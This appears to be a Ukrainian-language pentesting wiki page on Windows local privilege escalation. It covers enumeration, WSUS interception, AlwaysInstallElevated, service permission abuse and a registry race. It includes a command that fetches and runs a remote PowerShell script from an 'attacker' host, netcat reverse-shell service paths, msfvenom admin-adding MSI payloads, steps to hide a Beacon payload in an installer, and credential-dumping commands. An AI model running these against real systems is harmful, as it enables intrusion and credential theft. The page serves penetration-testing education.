# Локальне підвищення привілеїв у Windows

{{#include ../../banners/hacktricks-training.md}}

### **Найкращий інструмент для пошуку векторів локального підвищення привілеїв у Windows:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Початкова теорія Windows

### Токени доступу

**Якщо ви не знаєте, що таке токени доступу Windows, прочитайте наведену нижче сторінку, перш ніж продовжити:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACL — DACL/SACL/ACE

**Перегляньте наведену нижче сторінку, щоб дізнатися більше про ACL — DACL/SACL/ACE:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Рівні цілісності

**Якщо ви не знаєте, що таке рівні цілісності у Windows, прочитайте наведену нижче сторінку, перш ніж продовжити:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Засоби контролю безпеки Windows

У Windows є різні механізми, які можуть **перешкоджати вам виконувати enumeration системи**, запускати виконувані файли або навіть **виявляти ваші дії**. Перед початком enumeration для підвищення привілеїв слід **прочитати** наведену нижче **сторінку** та **перерахувати** всі ці **захисні** **механізми**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Захист адміністратора / приховане підвищення через UIAccess

Процеси UIAccess, запущені через `RAiLaunchAdminProcess`, можна використати для досягнення High IL без запитів, якщо обійти перевірки secure-path в AppInfo. Ознайомтеся зі спеціальним workflow обходу UIAccess/Admin Protection тут:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Поширення параметрів реєстру доступності Secure Desktop можна використати для довільного запису до реєстру від імені SYSTEM (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

У новіших збірках Windows також з’явився шлях LPE через **SMB arbitrary-port**, за якого привілейована локальна NTLM-аутентифікація відображається через повторно використане SMB TCP-з’єднання:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Інформація про систему

### Enumeration інформації про версію

Перевірте, чи має версія Windows відомі вразливості (також перевірте встановлені патчі).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Експлойти версій

Цей [сайт](https://msrc.microsoft.com/update-guide/vulnerability) зручний для пошуку детальної інформації про вразливості безпеки Microsoft. Ця база містить понад 4 700 вразливостей безпеки, демонструючи **величезну поверхню атаки**, яку створює середовище Windows.

**На системі**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas має вбудований watson)_

**Локально з інформацією про систему**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-репозиторії експлойтів:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Оточення

Чи збережено в змінних оточення будь-які credential/Juicy info?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### Історія PowerShell
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Файли транскриптів PowerShell

Дізнатися, як увімкнути цю функцію, можна за посиланням [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/).
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Деталі виконання конвеєра PowerShell записуються, зокрема виконані команди, виклики команд і частини скриптів. Однак повні відомості про виконання та результати виводу можуть не записуватися.

Щоб увімкнути цю функцію, дотримуйтеся інструкцій у розділі документації "Transcript files", вибравши **"Module Logging"** замість **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Щоб переглянути останні 15 подій із журналів PowersShell, можна виконати:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Фіксуються повний запис активності та весь вміст виконання скрипту, що гарантує документування кожного блоку коду під час його виконання. Цей процес зберігає комплексний аудиторський слід кожної дії, цінний для криміналістичного аналізу та дослідження шкідливої поведінки. Документування всієї активності під час виконання забезпечує детальне розуміння процесу.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Події журналювання для Script Block можна знайти у Windows Event Viewer за шляхом: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Щоб переглянути останні 20 подій, можна використати:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Налаштування Інтернету
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Диски
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Ви можете скомпрометувати систему, якщо оновлення запитуються не через http**S**, а через http.

Спочатку перевірте, чи використовує мережа оновлення WSUS без SSL, виконавши в cmd таку команду:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Або наступне в PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Якщо ви отримуєте відповідь на кшталт однієї з цих:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
І якщо `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` або `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` дорівнює `1`.

Тоді **це можна експлуатувати.** Якщо останнє значення реєстру дорівнює `0`, запис WSUS буде проігноровано.

Щоб експлуатувати ці вразливості, можна використовувати такі tools: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — це weaponized MiTM exploit-скрипти для ін’єкції «підроблених» оновлень у WSUS-трафік без SSL.

Дослідження доступне тут:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Прочитайте повний звіт тут**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
По суті, саме цю ваду використовує цей bug:

> Якщо ми можемо змінювати proxy локального користувача, а Windows Updates використовує proxy, налаштований у параметрах Internet Explorer, то ми можемо локально запустити [PyWSUS](https://github.com/GoSecure/pywsus), щоб перехопити власний трафік і виконати code від імені elevated user на нашому asset.
>
> Крім того, оскільки служба WSUS використовує налаштування поточного користувача, вона також використовуватиме його certificate store. Якщо ми згенеруємо self-signed certificate для hostname WSUS і додамо цей certificate до certificate store поточного користувача, то зможемо перехоплювати як HTTP-, так і HTTPS-трафік WSUS. WSUS не використовує механізми на кшталт HSTS для реалізації перевірки типу trust-on-first-use сертифіката. Якщо представлений certificate довірений користувачем і має правильний hostname, служба його прийме.

Цю вразливість можна експлуатувати за допомогою tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (після його release).

## Сторонні Auto-Updaters та Agent IPC (local privesc)

Багато enterprise agents надають IPC surface на localhost і privileged update channel. Якщо enrollment можна перенаправити на server атакувальника, а updater довіряє rogue root CA або використовує слабкі перевірки signer, локальний користувач може передати malicious MSI, який SYSTEM service встановить. Узагальнену техніку (на основі ланцюжка Netskope stAgentSvc — CVE-2025-0309) наведено тут:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM через TCP 9401)

Veeam B&R < `11.0.1.1261` надає localhost service на **TCP/9401**, яка обробляє повідомлення під контролем атакувальника, що дозволяє виконувати довільні команди від імені **NT AUTHORITY\SYSTEM**.

- **Recon**: підтвердьте наявність listener і версію, наприклад за допомогою `netstat -ano | findstr 9401` та `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: помістіть PoC, наприклад `VeeamHax.exe`, разом із необхідними Veeam DLL у той самий каталог, а потім запустіть SYSTEM payload через локальний socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Служба виконує команду від імені SYSTEM.
## KrbRelayUp

У середовищах Windows **домену** за певних умов існує вразливість **локального підвищення привілеїв**. Серед цих умов — середовища, де **підписування LDAP не застосовується,** користувачі мають права самостійно налаштовувати **Resource-Based Constrained Delegation (RBCD),** а також можливість користувачів створювати комп’ютери в домені. Важливо зазначити, що ці **вимоги** виконуються за **типових налаштувань**.

Знайдіть **експлойт у** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Докладніше про перебіг атаки дивіться тут: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Якщо** ці 2 параметри реєстру **увімкнено** (значення — **0x1**), користувачі з будь-якими привілеями можуть **встановлювати** (виконувати) файли `*.msi` від імені NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Якщо у вас є meterpreter session, ви можете автоматизувати цю техніку за допомогою модуля **`exploit/windows/local/always_install_elevated`**

### PowerUP

Використайте команду `Write-UserAddMSI` з power-up, щоб створити в поточному каталозі Windows MSI-бінарний файл для підвищення привілеїв. Цей скрипт записує попередньо скомпільований MSI-інсталятор, який запитує додавання користувача/групи (тому вам знадобиться GIU-доступ):
```
Write-UserAddMSI
```
Просто запустіть створений binary, щоб підвищити привілеї.

### MSI Wrapper

Прочитайте цей tutorial, щоб дізнатися, як створити MSI wrapper за допомогою цих tools. Зверніть увагу, що ви можете обгорнути файл "**.bat**", якщо ви **лише** хочете **виконати** **командні рядки**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Створення MSI за допомогою WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Створення MSI за допомогою Visual Studio

- За допомогою Cobalt Strike або Metasploit **згенеруйте** **новий Windows EXE TCP payload** у `C:\privesc\beacon.exe`
- Відкрийте **Visual Studio**, виберіть **Create a new project** і введіть "installer" у поле пошуку. Виберіть проєкт **Setup Wizard** і натисніть **Next**.
- Вкажіть назву проєкту, наприклад **AlwaysPrivesc**, використайте **`C:\privesc`** як розташування, виберіть **place solution and project in the same directory** і натисніть **Create**.
- Продовжуйте натискати **Next**, доки не перейдете до кроку 3 із 4 (вибір файлів для включення). Натисніть **Add** і виберіть щойно згенерований Beacon payload. Потім натисніть **Finish**.
- Виділіть проєкт **AlwaysPrivesc** у **Solution Explorer**, а в розділі **Properties** змініть **TargetPlatform** з **x86** на **x64**.
- Є й інші властивості, які можна змінити, наприклад **Author** і **Manufacturer**, щоб встановлена програма виглядала легітимнішою.
- Клацніть правою кнопкою миші проєкт і виберіть **View > Custom Actions**.
- Клацніть правою кнопкою миші **Install** і виберіть **Add Custom Action**.
- Двічі клацніть **Application Folder**, виберіть файл **beacon.exe** і натисніть **OK**. Це забезпечить виконання Beacon payload одразу після запуску інсталятора.
- У розділі **Custom Action Properties** змініть **Run64Bit** на **True**.
- Нарешті, **зіберіть його**.
- Якщо відображається попередження `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, переконайтеся, що ви встановили платформу x64.

### Інсталяція MSI

Щоб виконати **інсталяцію** шкідливого файлу `.msi` у **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Для експлуатації цієї вразливості можна використати: _exploit/windows/local/always_install_elevated_

## Антивірус і засоби виявлення

### Налаштування аудиту

Ці налаштування визначають, що саме **записується в журнал**, тому слід звернути увагу
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding: цікаво знати, куди надсилаються логи
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** призначений для **керування паролями локального адміністратора**, гарантуючи, що кожен пароль є **унікальним, випадковим і регулярно оновлюється** на комп’ютерах, приєднаних до домену. Ці паролі безпечно зберігаються в Active Directory, і доступ до них можуть отримати лише користувачі, яким через ACLs надано достатні дозволи для перегляду паролів локального адміністратора.

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Якщо активний, **паролі у відкритому тексті зберігаються в LSASS** (Local Security Authority Subsystem Service).\
[**Більше інформації про WDigest на цій сторінці**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Починаючи з **Windows 8.1**, Microsoft запровадила посилений захист Local Security Authority (LSA), щоб **блокувати** спроби ненадійних процесів **читати її пам'ять** або впроваджувати код, додатково підвищуючи безпеку системи.\
[**Більше інформації про LSA Protection тут**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** було представлено у **Windows 10**. Його призначення — захист облікових даних, що зберігаються на пристрої, від таких загроз, як атаки pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Кешовані облікові дані

**Облікові дані домену** автентифікуються **Local Security Authority** (LSA) і використовуються компонентами операційної системи. Коли дані входу користувача автентифіковано зареєстрованим пакетом безпеки, для цього користувача зазвичай створюються облікові дані домену.\
[**Докладніше про кешовані облікові дані**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Користувачі та групи

### Перелічити користувачів і групи

Перевірте, чи мають якісь групи, до яких ви належите, цікаві дозволи
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Привілейовані групи

Якщо ви **належите до певної привілейованої групи, ви можете отримати можливість підвищити привілеї**. Дізнайтеся про привілейовані групи та способи їх використання для підвищення привілеїв тут:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Маніпуляція токенами

**Дізнайтеся більше** про те, що таке **токен**, на цій сторінці: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Перегляньте наведену нижче сторінку, щоб **дізнатися про цікаві токени** та способи їх використання:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Користувачі, які увійшли в систему / Сеанси
```bash
qwinsta
klist sessions
```
### Домашні папки
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Політика паролів
```bash
net accounts
```
### Отримання вмісту буфера обміну
```bash
powershell -command "Get-Clipboard"
```
## Запущені процеси

### Права доступу до файлів і папок

Перш за все, під час перегляду процесів **перевірте наявність паролів у командному рядку процесу**.\
Перевірте, чи можете ви **перезаписати запущений бінарний файл**, або чи маєте права на запис до папки з бінарним файлом, щоб використати можливі [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Завжди перевіряйте наявність запущених [**electron/cef/chromium debuggers**], оскільки їх можна використати для підвищення привілеїв](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md).

**Перевірка дозволів бінарних файлів процесів**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Перевірка дозволів папок бінарних файлів процесів (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Видобування паролів із пам’яті

Ви можете створити дамп пам’яті запущеного процесу за допомогою **procdump** від sysinternals. Сервіси на кшталт FTP зберігають **облікові дані у відкритому тексті в пам’яті**. Спробуйте створити дамп пам’яті та прочитати облікові дані.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Небезпечні GUI-застосунки

**Застосунки, що працюють від імені SYSTEM, можуть дозволити користувачу запустити CMD або переглядати каталоги.**

Приклад: "Windows Help and Support" (Windows + F1), виконайте пошук "command prompt", натисніть "Click to open Command Prompt"

## Служби

Service Triggers дозволяють Windows запускати службу, коли виникають певні умови (активність іменованого каналу/RPC endpoint, події ETW, доступність IP, підключення пристрою, оновлення GPO тощо). Навіть без прав SERVICE_START ви часто можете запускати привілейовані служби, активуючи їхні тригери. Техніки перерахування та активації наведено тут:

-
{{#ref}}
service-triggers.md
{{#endref}}

Отримати список служб:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Дозволи

Ви можете використовувати **sc**, щоб отримати інформацію про службу
```bash
sc qc <service_name>
```
Рекомендується мати бінарний файл **accesschk** від _Sysinternals_, щоб перевіряти необхідний рівень привілеїв для кожної служби.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Рекомендується перевірити, чи можуть "Authenticated Users" змінювати будь-яку службу:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[Ви можете завантажити accesschk.exe для XP звідси](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Увімкнення служби

Якщо ви отримуєте цю помилку (наприклад, із SSDPSRV):

_Сталася системна помилка 1058._\
_Службу неможливо запустити, оскільки її вимкнено або з нею не пов’язано жодного ввімкненого пристрою._

Ви можете ввімкнути її за допомогою
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Врахуйте, що для роботи служби upnphost потрібна SSDPSRV (для XP SP1)**

**Інший спосіб обійти** цю проблему — виконати:
```
sc.exe config usosvc start= auto
```
### **Зміна шляху до бінарного файлу служби**

У сценарії, коли група "Authenticated users" має **SERVICE_ALL_ACCESS** для служби, можна змінити виконуваний бінарний файл служби. Щоб змінити та виконати **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Перезапуск служби
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Підвищити привілеї можна через різні дозволи:

- **SERVICE_CHANGE_CONFIG**: Дозволяє переналаштувати бінарний файл служби.
- **WRITE_DAC**: Уможливлює переналаштування дозволів, що дає змогу змінювати конфігурацію служб.
- **WRITE_OWNER**: Дозволяє отримати права власника та переналаштувати дозволи.
- **GENERIC_WRITE**: Успадковує можливість змінювати конфігурацію служб.
- **GENERIC_ALL**: Також успадковує можливість змінювати конфігурацію служб.

Для виявлення та експлуатації цієї вразливості можна використовувати _exploit/windows/local/service_permissions_.

### Слабкі дозволи на бінарні файли служб

Якщо служба працює від імені **`LocalSystem`**, **`LocalService`**, **`NetworkService`** або привілейованого доменного облікового запису, але **користувачі з низькими привілеями можуть змінювати EXE-файл служби або його батьківську папку**, службу часто можна перехопити, **замінивши бінарний файл і перезапустивши службу**.

**Перевірте, чи можете ви змінювати бінарний файл, який виконує служба**, або чи маєте **дозволи на запис до папки**, де розташований бінарний файл ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Отримати всі бінарні файли, які виконує служба, можна за допомогою **wmic** (не в system32), а потім перевірити дозволи за допомогою **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Також можна використовувати **sc** та **icacls**:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Шукайте небезпечні ACL, надані **`Everyone`**, **`BUILTIN\Users`** або **`Authenticated Users`**, особливо **`(F)`**, **`(M)`** або **`(W)`** для виконуваного файлу служби чи каталогу, що його містить. Практичний сценарій зловживання:

1. Підтвердьте обліковий запис служби та шлях до виконуваного файлу за допомогою `sc qc <service_name>`.
2. Підтвердьте, що бінарний файл доступний для запису, за допомогою `icacls <path>`.
3. Замініть бінарний файл служби payload або дійсним шкідливим бінарним файлом служби.
4. Перезапустіть службу за допомогою `sc stop <service_name> && sc start <service_name>` (або дочекайтеся перезавантаження / тригера служби).

Корисні автоматизовані перевірки:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Якщо служба не дозволяє звичайному користувачу перезапустити її, перевірте, чи запускається вона автоматично під час завантаження, чи має дію у разі збою, яка повторно запускає її, або чи може бути опосередковано запущена застосунком, який її використовує.

### Дозволи на зміну реєстру служб

Вам слід перевірити, чи можете ви змінювати будь-який реєстр служб.\
Ви можете **перевірити** свої **дозволи** щодо **реєстру** служби за допомогою:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Слід перевірити, чи мають **Authenticated Users** або **NT AUTHORITY\INTERACTIVE** дозволи `FullControl`. Якщо так, бінарний файл, який виконується службою, можна змінити.

Щоб змінити Path бінарного файлу, який виконується:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race для довільного запису значення HKLM (ATConfig)

Деякі функції **Accessibility** у Windows створюють ключі **ATConfig** для кожного користувача, які згодом копіюються процесом **SYSTEM** до ключа сеансу в HKLM. **Символічна гонка реєстру** може перенаправити цей привілейований запис до **будь-якого шляху HKLM**, надаючи примітив **запису довільного значення HKLM**.

Основні розташування ключів (приклад: екранна клавіатура `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` містить список встановлених функцій Accessibility.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` містить конфігурацію, контрольовану користувачем.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` створюється під час входу або переходів до secure desktop і доступний користувачу для запису.

Послідовність атаки (CVE-2026-24291 / ATConfig):

1. Заповніть значення **HKCU ATConfig**, яке має бути записане процесом SYSTEM.
2. Запустіть копіювання secure desktop (наприклад, за допомогою **LockWorkstation**), що запускає потік AT broker.
3. **Виграйте гонку**, встановивши **oplock** на `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; коли спрацює oplock, замініть ключ **HKLM Session ATConfig** на **registry link**, що вказує на захищену ціль HKLM.
4. SYSTEM записує вибране зловмисником значення до перенаправленого шляху HKLM.

Отримавши довільний запис значення HKLM, виконайте pivot до LPE, перезаписавши значення конфігурації service:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Виберіть service, який звичайний користувач може запустити (наприклад, **`msiserver`**), і запустіть його після запису. **Примітка:** публічна реалізація exploit **блокує workstation** як частину гонки.

Приклад tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Дозволи AppendData/AddSubdirectory для реєстру служб

Якщо у вас є цей дозвіл для реєстру, це означає, що **ви можете створювати підрозділи реєстру в ньому**. У випадку служб Windows цього **достатньо для виконання довільного коду:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Невзято в лапки шляхи до служб

Якщо шлях до виконуваного файлу не взято в лапки, Windows спробує виконати кожен варіант шляху до пробілу.

Наприклад, для шляху _C:\Program Files\Some Folder\Service.exe_ Windows спробує виконати:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
Перелічіть усі шляхи до служб без лапок, за винятком шляхів, що належать до вбудованих служб Windows:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
